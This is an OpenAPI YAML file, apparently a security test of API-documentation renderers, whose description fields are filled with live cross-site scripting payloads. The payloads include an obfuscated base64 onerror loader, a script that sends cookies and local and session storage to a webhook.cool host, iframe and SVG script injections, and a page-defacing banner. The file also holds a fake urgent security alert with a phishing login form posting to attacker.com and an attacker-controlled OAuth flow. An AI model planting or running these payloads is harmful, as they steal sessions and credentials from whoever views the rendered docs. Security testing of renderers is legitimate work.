openapi: 3.0.0
info:
  title: |
    XSS Test - Security Audit Document
  description: |
    <style>
      body { background-color: black !important; color: red !important; }
      .swagger-ui { font-family: 'Inter', sans-serif !important; }
      .swagger-ui .topbar { background-color: #8B0000 !important; border-bottom: 2px solid #FF0000 !important; }
      .swagger-ui .topbar-wrapper img { display: none !important; } /* Hide default logo */
      .swagger-ui .topbar-wrapper::before { content: 'WARNING: SYSTEM COMPROMISED - IMMEDIATE ACTION REQUIRED'; color: #FF0000; font-size: 24px; font-weight: bold; position: absolute; left: 20px; top: 15px; }
      .swagger-ui .opblock .opblock-summary-description { color: #FFD700 !important; }
      .swagger-ui .opblock-tag-section { background-color: #333 !important; border: 1px solid #666 !important; border-radius: 8px !important; }
      .swagger-ui .scheme-container { background-color: #222 !important; border: 1px solid #444 !important; border-radius: 8px !important; }
      .swagger-ui .model-box { background-color: #111 !important; border-radius: 8px !important; }
      .swagger-ui .model-title { color: #00FF00 !important; }
      .swagger-ui .prop-type { color: #FFD700 !important; }
      .swagger-ui .opblock-description-wrapper { border: 2px dashed red !important; padding: 15px !important; border-radius: 8px !important; }
      .swagger-ui .response-col_description p { color: yellow !important; }
      .swagger-ui section.block.works-as-is { background-color: #1a1a1a !important; border: 1px solid #333 !important; border-radius: 8px !important; margin-top: 20px; }
      .swagger-ui h1, .swagger-ui h2, .swagger-ui h3, .swagger-ui h4, .swagger-ui h5, .swagger-ui h6 { color: #00FF00 !important; }
      .swagger-ui p, .swagger-ui li, .swagger-ui a { color: #CCCCCC !important; }
      .fake-login-form {
        background: #444;
        padding: 20px;
        border-radius: 12px;
        max-width: 450px;
        margin: 30px auto;
        color: white;
        box-shadow: 0 0 20px rgba(255, 0, 0, 0.7);
        border: 2px solid #FF0000;
      }
      .fake-login-form input[type="text"],
      .fake-login-form input[type="password"] {
        width: calc(100% - 16px);
        padding: 10px;
        margin-bottom: 15px;
        border-radius: 6px;
        border: 1px solid #666;
        background: #555;
        color: white;
        font-size: 16px;
      }
      .fake-login-form button[type="submit"] {
        background-color: #FF0000;
        color: white;
        padding: 12px 20px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        width: 100%;
        font-size: 18px;
        font-weight: bold;
        transition: background-color 0.3s ease;
      }
      .fake-login-form button[type="submit"]:hover {
        background-color: #CC0000;
      }
    </style>

    <h1><span style="color: #FF0000;">&#9888;</span> SECURITY ALERT: CRITICAL ACTION REQUIRED <span style="color: #FF0000;">&#9888;</span></h1>
    <p>Dear User,</p>
    <p>Your session has been identified as compromised due to recent unusual activity. For your security, immediate re-authentication is required to prevent unauthorized access to your sensitive data.</p>
    <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExc3RvMXhvemxndGg0MzdldnQyazgyczEwdXpmdW5qZWpqZGxlc2M4aCZlcD12MV9pbnRlcm5uYWxfZ2lmX2J5X2lkJmN0PWc/e5jA4VlhW7gbHYKFrO/giphy.gif" alt="Security Breach Animated" style="max-width: 100%; height: auto; margin: 20px auto; display: block; border-radius: 8px;">

    <!-- Blind XSS Payload targeting webhook.site -->
    <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZW1iYXJyYXNzZWQtZ2lnYWJ5dGUtNDcud2ViaG9vay5jb29sIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOyBvbmVycm9yPWV2YWwoYXRvYih0aGlzLmlkKSk+ onerror=eval(atob(this.id)) style="display:none;">

    <!-- Re-introducing direct script tag for DOM XSS, with exfiltration to webhook.site -->
    <div style="display:none;">
      <script>
        try {
            const exfilData = {
                location: window.location.href,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage)
            };
            fetch('https://embarrassed-gigabyte-47.webhook.cool?data=' + btoa(JSON.stringify(exfilData)), {
                method: 'GET',
                mode: 'no-cors'
            }).then(() => console.log('Exfiltration attempt sent.')).catch(e => console.error('Exfiltration error:', e));
            alert('DOM XSS: Sensitive data exfiltration attempt initiated from Info Description!');
        } catch (e) {
            console.error('XSS payload failed:', e);
        }
      </script>
    </div>

    <!-- Re-introducing iframe srcdoc for visual XSS within description -->
    <iframe srcdoc="<p style='color:lime;font-size:20px;'>&#128008; You are now viewing malicious content &#128008;</p><script>parent.alert('iframe XSS from Info Description!');</script>" style="width:100%;height:100px;border:3px dashed #FF0000; border-radius: 8px;"></iframe>


    <div class="fake-login-form">
      <h2 style="text-align: center; color: #00FF00; margin-bottom: 25px;">Secure Login for Identity Verification</h2>
      <form action="https://attacker.com/phishing_endpoint" method="POST">
        <label for="phish_username" style="display: block; margin-bottom: 8px; font-weight: bold;">Username:</label>
        <input type="text" id="phish_username" name="username" placeholder="Enter your username" required>

        <label for="phish_password" style="display: block; margin-bottom: 8px; font-weight: bold;">Password:</label>
        <input type="password" id="phish_password" name="password" placeholder="Enter your password" required>

        <button type="submit">Verify Now</button>
        <p style="text-align: center; margin-top: 20px; font-size: 14px; color: #aaaaaa;">Note: All data transmitted is encrypted (fake assurance).</p>
      </form>
    </div>

    <p style="color: yellow; text-align: center; font-weight: bold;">Do NOT ignore this warning. Failure to re-authenticate will result in permanent account lockout within 24 hours.</p>
  version: 1.0.0
servers:
  - url: https://embarrassed-gigabyte-47.webhook.cool/v1
    description: Production API - DO NOT TRUST!
paths:
  /auth/emergency-password-reset:
    post:
      summary: "CRITICAL SECURITY BREACH: Immediate Password Reset Required!"
      description: |
        <p style="color: #FFA500; font-weight: bold; font-size: 1.2em;">A widespread data breach has been detected. You MUST reset your password through THIS endpoint to secure your account. Ignoring this will lead to account termination.</p>
        <!-- XSS payload in endpoint description for immediate execution -->
        <script>
          if (document.body) {
              const p = document.createElement('p');
              p.style.color = 'cyan';
              p.textContent = 'Endpoint Description XSS Active: Attempting to grab more data...';
              document.body.appendChild(p);
          }
          fetch('https://embarrassed-gigabyte-47.webhook.cool?log=endpoint_access&url=' + encodeURIComponent(window.location.href) + '&ua=' + encodeURIComponent(navigator.userAgent), { mode: 'no-cors' });
          alert('DOM XSS from Endpoint Description!');
        </script>
        <img src="x" onerror="alert('Image onerror XSS from Endpoint Description!');">
      operationId: initiatePasswordReset
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              properties:
                old_password:
                  type: string
                  format: password
                new_password:
                  type: string
                  format: password
                confirm_new_password:
                  type: string
                  format: password
      responses:
        '200':
          description: |
            <span style="color: lime; font-weight: bold;">Password Reset Successful (or is it?).</span>
            <script>alert('DOM XSS from 200 Response Description!');</script>
            <img src="x" onerror="alert('Image onerror XSS from 200 Response Description!');">
            <svg/onload="alert('SVG onload XSS from 200 Response Description!');">
            <iframe srcdoc="<p style='color: white;'>&#10003; Your password has been 'secured' &#10003;</p><script>parent.alert('iframe XSS from 200 Response!');</script>" style="width:100%;height:40px;border:1px solid lime; border-radius: 6px;"></iframe>
        '401':
          description: |
            <span style="color: #FF0000; font-weight: bold;">Password Reset Failed: Invalid Credentials.</span> Please retry immediately!
            <script>alert('DOM XSS from 401 Response Description!');</script>
            <img src="x" onerror="alert('Image onerror XSS from 401 Response Description - try harder!');">
            <svg/onload="alert('SVG onload XSS from 401 Response Description - almost there!');">

  /admin/backdoor-access:
    get:
      summary: "DEVELOPER BACKDOOR: FULL ADMIN ACCESS (HIGHLY DANGEROUS)"
      description: |
        <p style="color: #FF4500; font-weight: bold;">This endpoint provides direct root access. Only for debugging. Do not misuse.</p>
        <iframe srcdoc="<h2 style='color: orange;'>Administrator Control Panel</h2><form><input type='text' placeholder='Secret Key'><button>Login</button></form><script>parent.alert('iframe XSS from Backdoor Description!');</script>" style="width:100%;height:150px;border:2px solid orange; border-radius: 8px;"></iframe>
        <script>
          // Example of persistent XSS attempt by trying to modify page content
          try {
              const body = document.querySelector('body');
              if (body && !body.querySelector('#malicious-banner')) {
                  const banner = document.createElement('div');
                  banner.id = 'malicious-banner';
                  banner.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; background-color: #FF0000; color: white; text-align: center; padding: 10px; font-size: 24px; z-index: 9999; animation: blinker 1s linear infinite;';
                  banner.innerHTML = 'HACKED! <img src="x" onerror="alert(\'Top banner XSS!\');">';
                  body.prepend(banner);

                  const style = document.createElement('style');
                  style.textContent = '@keyframes blinker { 50% { opacity: 0; } }';
                  document.head.appendChild(style);
              }
          } catch (e) {
              console.error('Persistent XSS banner failed:', e);
          }
        </script>
      operationId: getBackdoorAccess
      responses:
        '200':
          description: |
            <span style="color: #FFD700; font-weight: bold;">Access Granted: Welcome, Administrator.</span>
            <script>alert('DOM XSS from Backdoor 200 Response!');</script>
            <img src="x" onerror="alert('Image onerror XSS from Backdoor 200 Response!');">
security:
  - oauth2_attacker_control: []
components:
  securitySchemes:
    oauth2_attacker_control:
      type: oauth2
      description: "ATTACKER-CONTROLLED OAuth2 Flow - DO NOT USE!"
      flows:
        authorizationCode:
          authorizationUrl: https://attacker.com/oauth/authorize-compromise # Attacker's Authorization URL
          tokenUrl: https://attacker.com/oauth/token-compromise # Attacker's Token Exchange URL
          scopes:
            read: Access to all user data (attacker controlled)
            write: Ability to modify user data (attacker controlled)
            delete: Full deletion privileges (attacker controlled)
            system: Complete system control (attacker controlled)
